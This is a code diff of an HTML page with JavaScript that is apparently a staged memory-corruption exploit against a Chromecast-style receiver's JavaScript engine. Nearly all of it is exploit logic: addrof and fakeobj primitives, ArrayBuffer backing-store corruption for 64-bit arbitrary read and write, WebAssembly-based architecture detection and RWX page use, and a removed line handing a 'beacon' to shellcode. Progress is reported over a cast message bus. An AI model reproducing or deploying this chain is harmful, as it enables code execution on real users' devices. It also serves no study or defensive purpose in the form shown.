-  if ((aProbe & 1) !== 1) { warn('stage4', 'addrof result not tagged — aliasing unreliable'); return; }
-  var back = fakeobj(aProbe);
-  if (back !== probe) { warn('stage4', 'fakeobj roundtrip mismatch'); return; }
-  report('stage4', true, 'fakeobj roundtrip OK');
-  try { if (!findBackingStoreSlot()) return; } catch (e5) { warn('stage5', 'AB scan threw: ' + e5); return; }
-  // sanity: retarget to itself and read back the marker we plant in the buffer
-  var bs0 = lo32(corrupted[AB_BS_SLOT]), bs0h = hi32(corrupted[AB_BS_SLOT]);
-  rwv.setUint32(0, 0xC0FFEE42, true);
-  var r = read64(bs0, bs0h);
-  if (r[0] !== 0xC0FFEE42) { warn('stage5', 'self-read sanity failed: 0x' + r[0].toString(16)); return; }
-  report('stage5', true, 'full 64-bit R/W validated (self-read 0xC0FFEE42)');
-  var archIs64 = CFG.IS64;
-  if (archIs64 === null) {
-    // auto-detect: instance field read at the aarch64 offset should look like a pointer
-    var inst0 = addrof(new WebAssembly.Instance(new WebAssembly.Module(WASM_BYTES), {})) & ~1;
-    var probe64 = read64(inst0 + CFG.JT_OFF_A64, 0);
-    archIs64 = !(probe64[0] === 0 && probe64[1] === 0) || (probe64[1] & 0xffff0000) !== 0;
-    report('stage6', true, 'arch auto-detect: is64=' + archIs64 + ' (probe 0x' + probe64[1].toString(16) + ':' + probe64[0].toString(16) + ')');
+  if (!stageL(foo)) {
+    warn2('done', 'length extension failed — honest stop');
+    return;
   }
-  try { if (!stage6(archIs64)) return; } catch (e6) { warn('stage6', 'threw: ' + e6); return; }
-  report('done', true, 'all stages OK; beacon handed off to shellcode');
-  if (CFG.CRASH_CONFIRM) crashConfirm();
+  if (!stage4(foo)) {
+    warn2('done', 'marker scan incomplete — honest stop');
+    return;
+  }
+  var rw = stageRW();
+  var af = stageAF();
+  if (!rw || !af) {
+    warn2('done', 'R/W or addrof/fakeobj proof incomplete — honest stop');
+    return;
+  }
+  var w = false;
+  try { w = stageW(); } catch (e) { warn2('stageW', 'threw: ' + e); }
+  report('done', true, 'stage2 chain: smash+extend+scan+RW+AF=' + (rw && af) +
+    ' wasmRWX=' + w + ' t=' + ts());
 }
 
-if (CFG.AUTO) {
-  try { main38003(); } catch (eTop) { warn('main', 'uncaught: ' + eTop); }
-} else {
-  report('idle', true, 'AUTO=false — call main38003() manually');
+try {
+  main();
+} catch (e) {
+  warn2('done', 'exception: ' + e + ' t=' + ts());
 }
 }catch(eOuter){try{var bE=cast.receiver.CastReceiverManager.getInstance().getCastMessageBus("urn:x-cast:net.max38003.stage");bE.broadcast(JSON.stringify({stage:"top-level",ok:false,msg:String(eOuter).slice(0,300)}));}catch(eR){}}
 </script></body></html>
